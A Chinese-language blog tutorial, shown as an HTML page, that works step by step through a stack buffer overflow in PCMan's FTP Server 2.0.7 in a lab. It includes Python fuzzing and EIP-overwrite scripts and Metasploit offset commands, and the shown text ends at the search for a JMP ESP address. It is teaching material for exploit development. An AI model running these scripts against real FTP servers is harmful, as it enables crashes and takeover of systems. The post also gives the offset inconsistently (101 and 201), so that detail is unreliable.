@@ -1,0 +1,230 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PCMan's FTP Server缓冲区溢出分析与利用 | Tao's blog</title><meta name="keywords" content="溢出攻击"><meta name="author" content="Bobtaoy"><meta name="copyright" content="Bobtaoy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="PCMan’s FTP Server 缓冲区溢出漏洞利用实验环境 WindowsXP-SP3，（机子上装有PCMan’s FTP Server 2.0.7， Immunityinc debugger, jmpesp.exe） 攻击机：kali 2.0  需要的基础：对x86汇编语言有一定的了解，python基础，常用调试工具的使用 缓冲区溢出基础详情参考：缓冲区溢出原理分析(一) ​    简单的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PCMan&#39;s FTP Server缓冲区溢出分析与利用">
+<meta property="og:url" content="http://www.ywboy.cn/2020/11/16/PCMan-s-FTP-Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Tao&#39;s blog">
+<meta property="og:description" content="PCMan’s FTP Server 缓冲区溢出漏洞利用实验环境 WindowsXP-SP3，（机子上装有PCMan’s FTP Server 2.0.7， Immunityinc debugger, jmpesp.exe） 攻击机：kali 2.0  需要的基础：对x86汇编语言有一定的了解，python基础，常用调试工具的使用 缓冲区溢出基础详情参考：缓冲区溢出原理分析(一) ​    简单的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/sky.jpg">
+<meta property="article:published_time" content="2020-11-16T06:43:43.000Z">
+<meta property="article:modified_time" content="2020-11-16T06:49:54.013Z">
+<meta property="article:author" content="Bobtaoy">
+<meta property="article:tag" content="溢出攻击">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/bobtaoi/md_img/raw/master/img/sky.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://www.ywboy.cn/2020/11/16/PCMan-s-FTP-Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2020-11-16 14:49:54'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Tao's blog" type="application/atom+xml">
+</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">19</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">8</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PCMan%E2%80%99s-FTP-Server-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">PCMan’s FTP Server 缓冲区溢出漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80"><span class="toc-number">1.2.</span> <span class="toc-text">缓冲区溢出基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">1.3.</span> <span class="toc-text">查找缓冲区溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95-Fuzzing"><span class="toc-number">1.3.1.</span> <span class="toc-text">模糊测试(Fuzzing)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B4%A9%E6%BA%83%E8%B0%83%E6%9F%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">崩溃调查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%81%8F%E7%A7%BB%E6%95%B0%EF%BC%88Finding-the-offset%EF%BC%89"><span class="toc-number">1.3.3.</span> <span class="toc-text">查找偏移数（Finding the offset）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEshellcode%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.4.</span> <span class="toc-text">寻找shellcode位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97-EIP-to-jump"><span class="toc-number">1.5.</span> <span class="toc-text">获得 EIP to jump</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90shellcode"><span class="toc-number">1.6.</span> <span class="toc-text">生成shellcode</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://gitee.com/bobtaoi/md_img/raw/master/img/sky.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tao's blog</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">PCMan's FTP Server缓冲区溢出分析与利用</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-11-16T06:43:43.000Z" title="Created 2020-11-16 14:43:43">2020-11-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-11-16T06:49:54.013Z" title="Updated 2020-11-16 14:49:54">2020-11-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="PCMan’s-FTP-Server-缓冲区溢出漏洞利用"><a href="#PCMan’s-FTP-Server-缓冲区溢出漏洞利用" class="headerlink" title="PCMan’s FTP Server 缓冲区溢出漏洞利用"></a>PCMan’s FTP Server 缓冲区溢出漏洞利用</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote>
+<p>WindowsXP-SP3，（机子上装有<code>PCMan’s FTP Server 2.0.7</code>， <code>Immunityinc debugger</code>, <code>jmpesp.exe</code>）</p>
+<p>攻击机：kali 2.0</p>
+</blockquote>
+<p>需要的基础：<code>对x86汇编语言有一定的了解</code>，<code>python基础</code>，常用调试工具的使用</p>
+<h2 id="缓冲区溢出基础"><a href="#缓冲区溢出基础" class="headerlink" title="缓冲区溢出基础"></a>缓冲区溢出基础</h2><p>详情参考：<a href="http://www.ywboy.cn/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-%E4%B8%80/">缓冲区溢出原理分析(一)</a></p>
+<p>​    简单的来说，如果我们输入的数据长度超过了开发人员定义的缓冲区，那么这个数据就可以覆盖掉关键的寄存器，如EIP，EIP是指令寄存器，它存放当前指令的下一条指令的地址。如果它被来自用户输入的垃圾数据覆盖了，程序通常会崩溃，因为它跳转到的地址并尝试指向，但执行的并不是有效的指令。我们的目的就是要定制一个数据发送到程序覆盖EIP，使程序跳转到我们控制的位置，这样我们就可以执行shellcode了</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/overflow.png" alt="img"></p>
+<blockquote>
+<p>图片来源：<a target="_blank" rel="noopener" href="http://www.legendsec.org/2020.html">http://www.legendsec.org/2020.html</a></p>
+</blockquote>
+<h2 id="查找缓冲区溢出"><a href="#查找缓冲区溢出" class="headerlink" title="查找缓冲区溢出"></a>查找缓冲区溢出</h2><h3 id="模糊测试-Fuzzing"><a href="#模糊测试-Fuzzing" class="headerlink" title="模糊测试(Fuzzing)"></a>模糊测试(Fuzzing)</h3><p>因为我们要完成一次缓冲区溢出测试，因此我们现在就需要知道哪里会发生缓冲区溢出，这里我们就需要进行模糊测试(fuzzing),现在我们需要发送不同长度和内容的自定义字符串到我们要测试的输入点，如果程序崩溃,那么我们就使用调试工具调查一下为什么会崩溃，可不可以利用,这里我们以<code>PCMan’s FTP Server 2.0.7</code>为例子</p>
+<p>首先我们来测试一下用户名这个输入点有没有存在问题。这里我们用Python编写了一个Fuzzer程序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>] 	<span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])	<span class="comment"># receive port</span></span><br><span class="line">fuzz = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        s.settimeout(<span class="number">2</span>)</span><br><span class="line">        s.send(<span class="string">&quot;USER &quot;</span> + <span class="string">&quot;A&quot;</span> * fuzz)</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line">        s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Send str length: &quot;</span> + str(fuzz)</span><br><span class="line">        fuzz += <span class="number">100</span></span><br><span class="line">    <span class="keyword">except</span> Exception,err:</span><br><span class="line">        <span class="keyword">print</span><span class="string">&quot;End..., Send str length: &quot;</span> + str(fuzz)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure>
+
+<p>首先我们打开PCmanFTP运行程序：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105219299.png" alt="image-20201116105219299"></p>
+<p>使用<code>./fuzzing.py 172.16.10.156 21</code>, 运行脚本，发现发送到大约2000的时候挂起了，检查我们的FTP服务器，可以发现已经崩溃。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105359862.png" alt="image-20201116105359862"></p>
+<p>接下来我们就要来进一步研究一下，确认这错误是否可以利用，我们重新启动<code>PCmanFTP</code>程序</p>
+<h3 id="崩溃调查"><a href="#崩溃调查" class="headerlink" title="崩溃调查"></a>崩溃调查</h3><p>打开<code>Immunityinc debugger</code>，然后<code>File-&gt;Attach</code> (首先要确保FTP程序已经在运行) </p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105643048.png" alt="image-20201116105643048"></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105741533.png" alt="image-20201116105741533"></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105757588.png" alt="image-20201116105757588"></p>
+<p>如上图所示，此时程序已经加载进来，是暂停状态， 我们使用快捷键<code>F9</code>让程序跑起来，也可以使用菜单栏的运行按钮</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105907120.png" alt="image-20201116105907120"></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105943781.png" alt="image-20201116105943781"></p>
+<p>当程序处于<code>Running</code>状态的时候，我们再一次运行<code>fuzzing.py</code>脚本。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116110423713.png" alt="image-20201116110423713"></p>
+<p>此时我们程序崩溃，但是这里的<code>EIP</code>值并没有覆盖成我们想要<code>41414141</code>, 但是根据程序输出我们可知，发送字符达到<code>2000</code>时使得程序崩溃，这里我们猜测<code>2000</code>只是刚好导致了程序溢出很小，并没有覆盖返回地址，我们再一次测试，这次测试将步长修改为<code>150</code>, 代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>] 	<span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])	<span class="comment"># receive port</span></span><br><span class="line">fuzz = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        s.settimeout(<span class="number">2</span>)</span><br><span class="line">        s.send(<span class="string">&quot;USER &quot;</span> + <span class="string">&quot;A&quot;</span> * fuzz)</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line">        s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Send str length: &quot;</span> + str(fuzz)</span><br><span class="line">        fuzz += <span class="number">150</span>		<span class="comment"># modify this</span></span><br><span class="line">    <span class="keyword">except</span> Exception,err:</span><br><span class="line">        <span class="keyword">print</span><span class="string">&quot;End..., Send str length: &quot;</span> + str(fuzz)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure>
+
+<p>程序输出：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116111221265.png" alt="image-20201116111221265"></p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116111250442.png" alt="image-20201116111250442"></p>
+<p>我们可以发现EIP寄存器的值是<code>41414141</code>，这意味着我们可以控制<code>EIP</code>，那么接下来我们要解决的问题就是哪里的A将EIP覆盖了呢？</p>
+<h3 id="查找偏移数（Finding-the-offset）"><a href="#查找偏移数（Finding-the-offset）" class="headerlink" title="查找偏移数（Finding the offset）"></a>查找偏移数（Finding the offset）</h3><p>使用Metasploit的pattern_create工具创建一个500大小的字符串，</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116111938456.png" alt="image-20201116111938456"></p>
+<p> 因为我们通过上面的测试，大概判断溢出字符在<code>1900~2050</code>, 那么我们填写<code>&#39;A&#39; * 1900 + &quot;工具生成字符&quot; </code>构成payload发送至FTP服务端，如上操作，我们让程序在<code>Immunityinc debugger</code>中运行起来,然后执行如下程序：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># filename: findoffset.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">1900</span> + <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&quot;</span></span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>] 	<span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])	<span class="comment"># receive port</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.send(<span class="string">&quot;USER &quot;</span> + payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116112858912.png" alt="image-20201116112858912"></p>
+<p>可以发现，这一次EIP寄存器的值是<code>0x34644133</code>, 为了计算这个值偏移量，我们使用Metasploit中的另一个工具<code>pattern_offset</code>来确定字节数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./pattern_offset.rb -l 500 -q 34644133</span><br><span class="line"><span class="comment"># -q参数为要查询的地址，-l参数为要查询的字符序列的长度</span></span><br><span class="line"><span class="comment"># 上图中我们得出的地址是 0x34644133, 而生成的字符串长度为500， 因此这里使用 -l 500 -q 34644133</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116134108549.png" alt="image-20201116134108549"></p>
+<p>计算结果为<code>101</code>, 也就是说覆盖返回地址是在<code>[2002-2005]</code> 这四个字节，我们来验证一下：</p>
+<blockquote>
+<p>注意，下图的1900 是我们上面findoffset.py这个程序pyload中的A字符数，而偏移量为201，那么最终覆盖EIP前的字符数就是1900+201=2001个字符</p>
+</blockquote>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116134446739.png" alt="image-20201116134446739"></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># filename: overeip.py</span><br><span class="line">import sys</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot; * <span class="number">2001</span> + &quot;B&quot; * <span class="number">4</span></span><br><span class="line">host = sys.argv[<span class="number">1</span>] 	# receive IP</span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])	# receive port</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.send(&quot;USER &quot; + payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(&quot;PASS Tao&quot;)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116135115486.png" alt="image-20201116135115486"></p>
+<p>执行程序：</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116135306161.png" alt="image-20201116135306161"></p>
+<p>查看windows xp，发现EIP（程序返回地址）被我们上面的4个B给覆盖了，到这一步，我们已经可以精确的覆盖EIP了</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116135248117.png" alt="image-20201116135248117"></p>
+<h2 id="寻找shellcode位置"><a href="#寻找shellcode位置" class="headerlink" title="寻找shellcode位置"></a>寻找shellcode位置</h2><p>我们在上面程序pyload后面加100个C，然后执行</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116140101236.png" alt="image-20201116140101236"></p>
+<p>可以看到，这里ESP指向的是我们在EIP后面给的<code>100个C</code>, 现在我们是要将C替换成我们希望运行的Shellcode。然后让EIP跳转到ESP寄存器的位置</p>
+<h2 id="获得-EIP-to-jump"><a href="#获得-EIP-to-jump" class="headerlink" title="获得 EIP to jump"></a>获得 EIP to jump</h2><p>为什么我们不能告诉EIP去内存地址0x0012EDB8呢？因为这个地址在各个计算机上都不一样得，你不可能只想这个攻击只能攻击自己计算机吧。所以这里我们就要在程序的dll中找到具有JMP ESP命令的内存地址。这样我们就可以将EIP指向该位置，使其跳转到我们的缓冲区中。</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116140431546.png" alt="image-20201116140431546"></p>
+<p>我们这里使用<code>Immunityinc debugger</code> 在程序的dll中找到具有<code>JMP ESP</code>命令的内存地址</p>
+<p>看看有哪些dll加载到了这个程序</p>
+<p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116140845375.png" alt="image-20201116140845375"></p>
